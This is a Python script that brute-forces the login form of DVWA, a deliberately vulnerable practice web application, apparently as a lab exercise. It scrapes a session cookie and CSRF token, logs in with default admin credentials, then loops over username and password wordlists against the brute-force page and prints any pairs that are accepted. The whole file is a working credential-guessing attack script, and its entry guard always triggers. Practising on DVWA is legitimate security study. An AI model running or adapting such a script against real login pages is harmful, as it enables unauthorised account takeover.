import requests
import re

BASE_URL = "http://evil/DVWA"
WordListUsers = "/home/busy/DVWA/Users"
WordListPwd = "/home/busy/DVWA/Password"
PHP_ID = ""
SECURITY = "low"

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# Performs a post request to log in in the website
def post_auth_login(url,username,password,php_id,csrf_token):
    custom_headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": f"PHPSESSID={php_id}; security=low",
        }
    post_data = f"username={username}&password={password}&Login=Login&user_token={csrf_token}"
    r = requests.post(url, headers=custom_headers,data=post_data)

    if r.status_code == 200:
        print("[+] LOGIN WEBSITE SUCCESULF")
    else:
         print("[!]ERROR LOGI WEBSITE")
# Performs the basic login to get an authenticated PHPSESSID value,
# which is then return and can be used for further requests.
# 
def get_auth_cookie(url, username, password):
    php_id = ""
    csrf_token = ""

    # first, we get login page to recive PHPSESSID
    url = url + "/login.php"
    r = requests.get(url)

    # Define the regex pattern to match PHPSESSID value
    pattern = r"PHPSESSID=([^;]+)"
    match = re.search(pattern, str(r.cookies))
    print(r.cookies)
    if match:
        php_id = match.group(1).split()[0]
        print(f"[+] PHPSESSID value:", php_id)
    else:
        print(f"{bcolors.FAIL}[!] PHPSESSID not found")
    
    #Define the regex pattern to match CSRF TOKEN value

    pattern = r" name='user_token' value='([^']+)"
    match = re.search(pattern, str(r.text))
    
    if match:
        csrf_token = match.group(1)
        print(f"[+] CSRF TOKEN value:", csrf_token)
    else:
        print(f"{bcolors.FAIL}[!] PHPSESSID not found")

    # Post request to login page
    post_auth_login(url,username,password,php_id,csrf_token)

    return php_id

# Performs the basic request to a login page.
# 
def GetRequest(user, password):
    global BASE_URL,SECURITY

    url = BASE_URL + "/vulnerabilities/brute/"
    params = {"username": user, "password": password, "Login": "Login"}
    cookies = {'security': SECURITY, "PHPSESSID": PHP_ID}

    r = requests.get(url, cookies=cookies, params=params)

    if r.status_code != 200:
        print(f"{bcolors.FAIL}[!] Error in bruteforce request, status code {str(r.status_code)}")
    return r.text

def main():
    global PHP_ID,BASE_URL
    if PHP_ID == "":
        PHP_ID = get_auth_cookie(BASE_URL,"admin", "password")

    for i in open(WordListUsers):
        for y in open(WordListPwd):
            i = i.strip()
            y = y.strip()

            response = GetRequest(i, y)

            # Check if the incorrect phrase isn't in the response
            if "Username and/or password incorrect." not in response: 
                print(f"{bcolors.OKCYAN}[+] Possible credentials found. Username: {i} Password: {y}")

if "__name__" == "__name__":
    main()